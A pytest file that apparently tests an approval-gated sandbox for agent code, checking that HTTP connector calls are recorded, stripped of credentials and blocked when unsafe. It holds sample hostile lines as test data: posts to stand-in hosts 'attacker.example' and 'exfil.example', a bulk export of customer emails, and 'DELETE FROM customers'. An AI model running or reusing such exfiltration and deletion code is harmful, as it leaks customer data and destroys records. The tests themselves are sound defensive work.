"""HTTP connectors: calls are recorded in the sandbox, policy-checked, and replayed with server-side credentials on approval."""
import json
import time

import pytest
from fastapi.testclient import TestClient

from app import agent, apply as applier, connectors, main, sandbox
from tests.conftest import needs_docker


def rehearse(body: str) -> dict:
    code = "def run(ctx):\n" + "\n".join("    " + line for line in body.strip().splitlines()) + "\n"
    return sandbox.rehearse(code)


def critical(c) -> set:
    return {f["rule"] for f in agent.red_flags(c) if f["severity"] == "critical"}


@pytest.fixture(autouse=True)
def clean_outbox():
    connectors.reset()
    yield
    connectors.reset()


@needs_docker
def test_slack_call_is_recorded_then_delivered_after_approval_without_plan_secrets(fresh_business, monkeypatch):
    monkeypatch.setattr(main.config, "INFERENCE_KEY", "")
    code = ('def run(ctx):\n'
            '    ctx.http.post("https://hooks.slack.com/services/ops", json={"text": "Refunds are going out"},\n'
            '                  headers={"Authorization": "Bearer stolen", "X-Request-Id": "abc"})\n')
    api = TestClient(main.app)
    rid = api.post("/api/runs/manual", json={"task": "Tell #ops", "code": code}).json()["id"]
    for _ in range(80):
        run = api.get(f"/api/runs/{rid}").json()
        if run["status"] == "review":
            break
        time.sleep(0.25)
    c = run["attempts"][-1]["consequences"]
    assert c["http"]["count"] == 1 and "Authorization" not in c["http"]["samples"][0]["headers"]
    assert c["http"]["samples"][0]["headers"] == {"X-Request-Id": "abc"}
    assert not critical(c)
    plan_deliveries = [d for d in api.get("/api/outbox").json()["deliveries"] if d["path"] != "/stunt-double/notify"]
    assert plan_deliveries == []                                            # nothing from the plan is sent during the rehearsal
    applied = api.post(f"/api/runs/{rid}/approve").json()
    assert applied["status"] == "applied" and applied["apply_result"]["http_delivered"] == 1
    d = [x for x in api.get("/api/outbox").json()["deliveries"] if x["path"] != "/stunt-double/notify"][0]
    assert d["connector"] == "slack" and json.loads(d["body"]) == {"text": "Refunds are going out"} and d["run_id"] == rid


@needs_docker
def test_unknown_host_and_disallowed_method_are_blocked(fresh_business):
    res = rehearse('ctx.http.post("https://attacker.example/collect", json={"x": 1})')
    assert "connectors_only" in critical(res["consequences"])
    with pytest.raises(ValueError, match="no connector"):
        applier.apply("run_x", res["effects_path"])
    c = rehearse('ctx.http.delete("https://hooks.slack.com/services/ops")')["consequences"]
    assert "connectors_only" in critical(c)
    c = rehearse('ctx.http.post("http://hooks.slack.com/services/ops", json={})')["consequences"]
    assert "connectors_only" in critical(c)


@needs_docker
def test_bad_call_hidden_after_many_good_ones_is_still_flagged(fresh_business):
    c = rehearse('''
for i in range(30):
    url = "https://exfil.example/x" if i == 26 else "https://hooks.slack.com/services/ops"
    ctx.http.post(url, json={"i": i})
''')["consequences"]
    assert c["http"]["count"] == 30 and len(c["http"]["samples"]) == 25
    assert "connectors_only" in critical(c)


@needs_docker
def test_bulk_customer_data_to_a_connector_is_blocked(fresh_business):
    c = rehearse('''
emails = [r[0] for r in ctx.db.execute("SELECT email FROM customers LIMIT 50").fetchall()]
ctx.http.post("https://api.beancrm.example/v1/import", json={"contacts": emails})
''')["consequences"]
    assert "block_data_leaks" in critical(c)


def test_connectors_endpoint_never_exposes_delivery_targets():
    api = TestClient(main.app)
    data = api.get("/api/connectors").json()["connectors"]
    assert {c["name"] for c in data} >= {"slack", "crm"}
    assert all("deliver_to" not in c and "url_env" not in c and "token_env" not in c for c in data)


@needs_docker
def test_reviewers_are_notified_on_slack_but_not_for_blocked_runs(fresh_business, monkeypatch):
    from tests.test_engine import CORRECT
    monkeypatch.setattr(main.config, "INFERENCE_KEY", "")
    monkeypatch.setattr(main.config, "PUBLIC_URL", "https://demo.example")
    api = TestClient(main.app)
    rid = api.post("/api/runs/manual", json={"task": "Refund duplicates", "code": CORRECT}).json()["id"]
    for _ in range(80):
        if api.get(f"/api/runs/{rid}").json()["status"] == "review":
            break
        time.sleep(0.25)
    d = api.get("/api/outbox").json()["deliveries"]
    assert len(d) == 1 and d[0]["connector"] == "slack" and f"https://demo.example/app?run={rid}" in json.loads(d[0]["body"])["text"]
    r = api.post("/api/runs/manual", json={"task": "clean up", "code": "def run(ctx):\n    ctx.db.execute('DELETE FROM customers')\n"})
    assert r.status_code == 200, r.text
    blocked = r.json()["id"]
    for _ in range(80):
        if api.get(f"/api/runs/{blocked}").json()["status"] == "review":
            break
        time.sleep(0.25)
    assert api.get("/api/outbox").json()["count"] == 1                       # no ping for a blocked run
    assert api.put("/api/policy", json={"notify_connector": "nope"}).status_code == 422
    assert api.put("/api/policy", json={"notify_connector": ""}).status_code == 200
